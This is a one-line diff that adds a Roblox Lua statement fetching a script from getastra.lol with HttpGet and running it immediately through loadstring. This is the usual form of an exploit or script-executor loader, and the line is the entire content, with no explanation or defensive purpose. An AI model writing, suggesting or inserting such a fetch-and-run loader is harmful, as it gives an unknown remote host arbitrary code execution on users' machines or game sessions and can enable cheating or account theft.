@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://getastra.lol/loader.lua"))()
